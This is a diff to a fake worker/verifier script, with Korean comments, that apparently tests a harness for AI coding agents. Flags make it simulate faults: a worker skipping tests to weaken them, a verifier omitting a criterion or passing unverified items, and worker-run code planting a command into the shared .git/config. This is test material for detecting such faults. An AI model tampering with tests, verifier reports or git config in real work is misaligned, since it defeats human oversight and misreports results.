@@ -41,9 +41,14 @@ def report(**kw):
     return "작업 결과입니다.\n\n```json\n" + json.dumps(base, ensure_ascii=False) + "\n```"
 
 
-def verdict(v, items=None):
-    return "검증 결과\n```json\n" + json.dumps({"verdict": v, "items": items or [{"item": "기준", "result": v, "evidence": "fake"}],
-                                                 "other_issues": []}, ensure_ascii=False) + "\n```"
+def verdict(v, items=None, prompt=""):
+    """프롬프트의 번호 붙은 완료 기준(E1, E2, ...)마다 한 항목씩 보고한다."""
+    if items is None:
+        ids = re.findall(r"^- (E\d+): (.*)$", prompt, re.M) or [("E1", "기준")]
+        if os.environ.get("FAKE_VERIFIER_OMIT_LAST") and len(ids) > 1:
+            ids = ids[:-1]  # 검증자가 항목 하나를 빠뜨리는 상황
+        items = [{"id": i, "item": t, "result": v, "evidence": "fake"} for i, t in ids]
+    return "검증 결과\n```json\n" + json.dumps({"verdict": v, "items": items, "other_issues": []}, ensure_ascii=False) + "\n```"
 
 
 INTEG = "hobin/integration"
@@ -148,6 +153,15 @@ def r_silent(prompt):
 def r_quick(prompt):
     if os.environ.get("FAKE_DROP_AFTER") and CUR["n"] >= int(os.environ["FAKE_DROP_AFTER"]):
         return report(status="dropped", summary="바꿀 것 없음")
+    repo_cfg = os.path.join(os.environ["FAKE_REPO"], ".git", "config")
+    if os.environ.get("FAKE_BENIGN"):
+        # 워커가 도는 동안 사람이 `git remote add`, `git push -u`를 한 상황 (위험하지 않은 설정 변경)
+        subprocess.run(["git", "config", "--file", repo_cfg, "remote.origin.url", "https://example.com/x.git"], check=True)
+        subprocess.run(["git", "config", "--file", repo_cfg, "branch.main.remote", "origin"], check=True)
+    if os.environ.get("FAKE_WEAKEN") and CUR["n"] == 0:
+        write("tests/test_x.py", "import pytest\n\n@pytest.mark.skip\ndef test_a():\n    pass\n")  # 테스트를 느슨하게
+    if os.environ.get("FAKE_SHARED"):
+        write("lock.txt", f"{CUR['tid']} round {CUR['n']}\n")  # 여러 티켓이 함께 고치는 파일
     if os.environ.get("FAKE_EVIL"):
         # 워커가 실행한 (테스트) 코드가 공유 .git/config에 명령을 심는 상황
         subprocess.run(["git", "config", "--file", os.path.join(os.environ["FAKE_REPO"], ".git", "config"),
@@ -206,10 +220,11 @@ def main():
             write("verifier-junk.txt", "should be removed\n")  # 검증자가 파일을 건드리는 상황
         plan = VERIFIER.get(tid, ["pass"])
         if tid == "T-010" and os.environ.get("FAKE_MODE") != "robust":
-            text = verdict("pass", [{"item": "화면 확인", "result": "unverified", "evidence": "브라우저 없음"},
-                                    {"item": "파일 존재", "result": "pass", "evidence": "ls ui/page.html"}])
+            text = verdict("pass", [{"id": "E1", "item": "화면 확인", "result": "unverified", "evidence": "브라우저 없음"}])
+        elif os.environ.get("FAKE_VERIFY_FAIL_FIRST") and n == 0:
+            text = verdict("fail", prompt=prompt)
         else:
-            text = verdict(plan[min(n, len(plan) - 1)])
+            text = verdict(plan[min(n, len(plan) - 1)], prompt=prompt)
     out({"type": "assistant", "message": {"content": [{"type": "tool_use", "name": "Bash", "input": {"command": "git status"}}]}})
     with open(STATE / "timeline.log", "a") as fh:
         fh.write(f"{time.time():.3f} end {tid} {role}\n")
